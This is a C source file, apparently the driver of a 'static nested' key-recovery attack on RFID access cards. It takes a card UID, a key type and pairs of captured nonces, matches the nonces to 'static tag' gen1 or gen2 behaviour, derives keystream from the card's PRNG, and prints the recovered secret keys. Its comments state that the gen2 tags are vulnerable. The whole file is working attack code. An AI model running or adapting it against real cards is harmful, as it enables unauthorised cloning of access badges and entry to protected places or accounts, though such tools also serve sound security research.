#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <inttypes.h>
#include "common.h"
#include "nested_util.h"

int main(int argc, char *const argv[])
{
    NtpKs1 *pNK = NULL;
    uint32_t i, j;
    uint32_t nt1, nt2, nttest, ks1, dist;

    uint32_t authuid = atoui(argv[1]);      // uid
    uint8_t type = (uint8_t)atoui(argv[2]); // target key type

    // process all args.
    bool check_st_level_at_first_run = false;
    for (i = 3, j = 0; i < (uint32_t)argc; i += 2)
    {
        // nt + par
        nt1 = atoui(argv[i]);
        nt2 = atoui(argv[i + 1]);

        // Which generation of static tag is detected.
        if (!check_st_level_at_first_run)
        {
            if (nt1 == 0x01200145)
            {
                // There is no loophole in this generation.
                // This tag can be decrypted with the default parameter value 160!
                dist = 160; // st gen1
            }
            else if (nt1 == 0x009080A2)
            { // st gen2
                // We found that the gen2 tag is vulnerable too but parameter must be adapted depending on the attacked key
                if (type == 0x61)
                {
                    dist = 161;
                }
                else if (type == 0x60)
                {
                    dist = 160;
                }
                else
                {
                    // can't be here!!!
                    goto error;
                }
            }
            else
            {
                // can't be here!!!
                goto error;
            }
            check_st_level_at_first_run = true;
        }

        nttest = prng_successor(nt1, dist);
        ks1 = nt2 ^ nttest;
        ++j;
        dist += 160;

        void *tmp = realloc(pNK, sizeof(NtpKs1) * j);
        if (tmp == NULL)
        {
            goto error;
        }

        pNK = tmp;
        pNK[j - 1].ntp = nttest;
        pNK[j - 1].ks1 = ks1;
    }
    uint32_t keyCount = 0;
    uint64_t *keys = nested(pNK, j, authuid, &keyCount);

    if (keyCount > 0)
    {
        for (i = 0; i < keyCount; i++)
        {
            printf("Key %d... %" PRIx64 " \r\n", i + 1, keys[i]);
            fflush(stdout);
        }
    }
    fflush(stdout);
    free(keys);
    exit(EXIT_SUCCESS);
error:
    exit(EXIT_FAILURE);
}
